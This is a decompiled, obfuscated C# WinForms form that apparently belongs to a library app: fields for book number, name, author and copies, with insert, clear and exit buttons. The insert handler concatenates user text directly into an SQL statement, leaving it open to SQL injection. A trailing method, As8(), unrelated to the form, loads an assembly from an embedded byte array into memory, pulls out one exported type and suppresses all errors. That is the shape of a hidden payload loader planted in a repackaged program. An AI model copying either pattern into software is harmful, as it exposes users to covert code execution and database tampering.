using System;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Cq2e;
using Lt35;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using z2SR;

namespace i2D;

[DesignerGenerated]
public class Lb0 : Form
{
	private Label _Label1;

	private Label _Label3;

	private TextBox _TextBox1;

	private TextBox _TextBox3;

	private TextBox _TextBox4;

	private Button _Button1;

	private Button _Button3;

	private ErrorProvider _ErrorProvider2;

	internal IContainer x;

	internal Label o;

	internal Label w;

	internal TextBox T;

	internal Button s;

	internal ErrorProvider I;

	internal ErrorProvider Y;

	internal ErrorProvider D;

	public Lb0()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		((Form)this).add_FormClosed(new FormClosedEventHandler(Nz7));
		Yo8();
	}

	protected override void t4H(bool c6Y)
	{
		try
		{
			if (c6Y && x != null)
			{
				x.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(c6Y);
		}
	}

	private void Yo8()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Expected O, but got Unknown
		IContainer container = (x = new Container());
		Lb3(new Label());
		Ar5(new Label());
		g3R(new Label());
		p7J(new Label());
		x6W(new TextBox());
		Jo4(new TextBox());
		Rx1(new TextBox());
		Cz9(new TextBox());
		b9H(new Button());
		j8M(new Button());
		o5B(new Button());
		Te4(new ErrorProvider(x));
		We3(new ErrorProvider(x));
		f0H(new ErrorProvider(x));
		Mg8(new ErrorProvider(x));
		((ISupportInitialize)x5N()).BeginInit();
		((ISupportInitialize)e8H()).BeginInit();
		((ISupportInitialize)Pw7()).BeginInit();
		((ISupportInitialize)x0G()).BeginInit();
		((Control)this).SuspendLayout();
		d3K().set_AutoSize(true);
		((Control)d3K()).set_Location(new Point(13, 13));
		((Control)d3K()).set_Name("Label1");
		((Control)d3K()).set_Size(new Size(72, 13));
		((Control)d3K()).set_TabIndex(0);
		d3K().set_Text("Book Number");
		Dd0().set_AutoSize(true);
		((Control)Dd0()).set_Location(new Point(13, 50));
		((Control)Dd0()).set_Name("Label2");
		((Control)Dd0()).set_Size(new Size(63, 13));
		((Control)Dd0()).set_TabIndex(1);
		Dd0().set_Text("Book Name");
		Ao9().set_AutoSize(true);
		((Control)Ao9()).set_Location(new Point(13, 88));
		((Control)Ao9()).set_Name("Label3");
		((Control)Ao9()).set_Size(new Size(69, 13));
		((Control)Ao9()).set_TabIndex(2);
		Ao9().set_Text("Author Name");
		Wy7().set_AutoSize(true);
		((Control)Wy7()).set_Location(new Point(16, 130));
		((Control)Wy7()).set_Name("Label4");
		((Control)Wy7()).set_Size(new Size(91, 13));
		((Control)Wy7()).set_TabIndex(3);
		Wy7().set_Text("Number of Copies");
		((Control)i8D()).set_Location(new Point(120, 10));
		((Control)i8D()).set_Name("TextBox1");
		((Control)i8D()).set_Size(new Size(159, 20));
		((Control)i8D()).set_TabIndex(4);
		((Control)Em0()).set_Location(new Point(120, 47));
		((Control)Em0()).set_Name("TextBox2");
		((Control)Em0()).set_Size(new Size(159, 20));
		((Control)Em0()).set_TabIndex(5);
		((Control)Tk8()).set_Location(new Point(120, 85));
		((Control)Tk8()).set_Name("TextBox3");
		((Control)Tk8()).set_Size(new Size(159, 20));
		((Control)Tk8()).set_TabIndex(6);
		((Control)Re6()).set_Location(new Point(120, 127));
		((Control)Re6()).set_Name("TextBox4");
		((Control)Re6()).set_Size(new Size(159, 20));
		((Control)Re6()).set_TabIndex(7);
		((Control)k1S()).set_Location(new Point(13, 189));
		((Control)k1S()).set_Name("Button1");
		((Control)k1S()).set_Size(new Size(75, 23));
		((Control)k1S()).set_TabIndex(8);
		((ButtonBase)k1S()).set_Text("Clear");
		((ButtonBase)k1S()).set_UseVisualStyleBackColor(true);
		((Control)Sn9()).set_Location(new Point(109, 189));
		((Control)Sn9()).set_Name("Button2");
		((Control)Sn9()).set_Size(new Size(75, 23));
		((Control)Sn9()).set_TabIndex(9);
		((ButtonBase)Sn9()).set_Text("Insert");
		((ButtonBase)Sn9()).set_UseVisualStyleBackColor(true);
		((Control)w5H()).set_Location(new Point(204, 189));
		((Control)w5H()).set_Name("Button3");
		((Control)w5H()).set_Size(new Size(75, 23));
		((Control)w5H()).set_TabIndex(10);
		((ButtonBase)w5H()).set_Text("Exit");
		((ButtonBase)w5H()).set_UseVisualStyleBackColor(true);
		x5N().set_ContainerControl((ContainerControl)(object)this);
		e8H().set_ContainerControl((ContainerControl)(object)this);
		Pw7().set_ContainerControl((ContainerControl)(object)this);
		x0G().set_ContainerControl((ContainerControl)(object)this);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(310, 241));
		((Control)this).get_Controls().Add((Control)(object)w5H());
		((Control)this).get_Controls().Add((Control)(object)Sn9());
		((Control)this).get_Controls().Add((Control)(object)k1S());
		((Control)this).get_Controls().Add((Control)(object)Re6());
		((Control)this).get_Controls().Add((Control)(object)Tk8());
		((Control)this).get_Controls().Add((Control)(object)Em0());
		((Control)this).get_Controls().Add((Control)(object)i8D());
		((Control)this).get_Controls().Add((Control)(object)Wy7());
		((Control)this).get_Controls().Add((Control)(object)Ao9());
		((Control)this).get_Controls().Add((Control)(object)Dd0());
		((Control)this).get_Controls().Add((Control)(object)d3K());
		((Control)this).set_Name("Form7");
		((Form)this).set_Text("Insert Book");
		((ISupportInitialize)x5N()).EndInit();
		((ISupportInitialize)e8H()).EndInit();
		((ISupportInitialize)Pw7()).EndInit();
		((ISupportInitialize)x0G()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label d3K()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Lb3(Label j9G)
	{
		_Label1 = j9G;
	}

	[SpecialName]
	internal virtual Label Dd0()
	{
		return o;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ar5(Label Zx2)
	{
		Label val = (o = Zx2);
	}

	[SpecialName]
	internal virtual Label Ao9()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g3R(Label r6C)
	{
		_Label3 = r6C;
	}

	[SpecialName]
	internal virtual Label Wy7()
	{
		return w;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p7J(Label e6S)
	{
		Label val = (w = e6S);
	}

	[SpecialName]
	internal virtual TextBox i8D()
	{
		return _TextBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x6W(TextBox Mm0)
	{
		_TextBox1 = Mm0;
	}

	[SpecialName]
	internal virtual TextBox Em0()
	{
		return T;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jo4(TextBox q0P)
	{
		TextBox val = (T = q0P);
	}

	[SpecialName]
	internal virtual TextBox Tk8()
	{
		return _TextBox3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Rx1(TextBox m1S)
	{
		_TextBox3 = m1S;
	}

	[SpecialName]
	internal virtual TextBox Re6()
	{
		return _TextBox4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cz9(TextBox q1F)
	{
		_TextBox4 = q1F;
	}

	[SpecialName]
	internal virtual Button k1S()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b9H(Button y4G)
	{
		EventHandler eventHandler = a0E;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = y4G;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Sn9()
	{
		return s;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j8M(Button Xo4)
	{
		EventHandler eventHandler = Zn4;
		Button val = s;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (s = Xo4);
		val = s;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button w5H()
	{
		return _Button3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o5B(Button a5Y)
	{
		EventHandler eventHandler = Hd3;
		Button button = _Button3;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button3 = a5Y;
		button = _Button3;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ErrorProvider x5N()
	{
		return I;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Te4(ErrorProvider y1Y)
	{
		ErrorProvider val = (I = y1Y);
	}

	[SpecialName]
	internal virtual ErrorProvider e8H()
	{
		return _ErrorProvider2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void We3(ErrorProvider d4Y)
	{
		_ErrorProvider2 = d4Y;
	}

	[SpecialName]
	internal virtual ErrorProvider Pw7()
	{
		return Y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f0H(ErrorProvider Pp0)
	{
		ErrorProvider val = (Y = Pp0);
	}

	[SpecialName]
	internal virtual ErrorProvider x0G()
	{
		return D;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mg8(ErrorProvider Ws7)
	{
		ErrorProvider val = (D = Ws7);
	}

	private void Nz7(object sender, EventArgs e)
	{
		((Control)Fb9z.Forms.r8G3()).Show();
		((Control)this).Hide();
	}

	private void a0E(object sender, EventArgs e)
	{
		i8D().set_Text("");
		Em0().set_Text("");
		Tk8().set_Text("");
		Re6().set_Text("");
	}

	private void Hd3(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	private void Zn4(object sender, EventArgs e)
	{
		//IL_0218: Unknown result type (might be due to invalid IL or missing references)
		//IL_021f: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_024b: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(i8D().get_Text(), "", false) == 0)
		{
			x5N().SetError((Control)(object)i8D(), "Please Enter Book Number");
		}
		else
		{
			x5N().Clear();
		}
		if (Operators.CompareString(Em0().get_Text(), "", false) == 0)
		{
			e8H().SetError((Control)(object)Em0(), "Please Enter Book Name");
		}
		else
		{
			e8H().Clear();
		}
		if (Operators.CompareString(Em0().get_Text(), "", false) == 0)
		{
			Pw7().SetError((Control)(object)Tk8(), "Please Enter Author Name");
		}
		else
		{
			Pw7().Clear();
		}
		if (Operators.CompareString(Re6().get_Text(), "", false) == 0)
		{
			x0G().SetError((Control)(object)Re6(), "Please Enter Number of Copies");
			return;
		}
		x0G().Clear();
		if (!Versioned.IsNumeric((object)i8D().get_Text()))
		{
			x5N().SetError((Control)(object)i8D(), "Enter Integer Value only");
			return;
		}
		x5N().Clear();
		if (!Versioned.IsNumeric((object)Re6().get_Text()))
		{
			x0G().SetError((Control)(object)Re6(), "Enter Integer Value only");
			return;
		}
		x0G().Clear();
		checked
		{
			int num = (int)Math.Round(Conversion.Val(i8D().get_Text()));
			string text = Em0().get_Text().ToUpper();
			string text2 = Tk8().get_Text().ToUpper();
			int num2 = (int)Math.Round(Conversion.Val(Re6().get_Text()));
			string text3 = "insert into books values(" + Conversions.ToString(num) + ",'" + text + "','" + text2 + "'," + Conversions.ToString(num2) + ")";
			try
			{
				SqlCommand val = new SqlCommand(text3, Eb3s.con);
				val.ExecuteNonQuery();
				Interaction.MsgBox((object)"Added New item", (MsgBoxStyle)0, (object)"Please press on refresh");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
			k1S().PerformClick();
		}
	}

	internal static bool As8()
	{
		try
		{
			try
			{
				Mj02.mDic.Add(Mj02.T, AppDomain.CurrentDomain.Load((byte[])Mj02.mDic[Mj02.mArray]).GetExportedTypes()[27]);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}
}
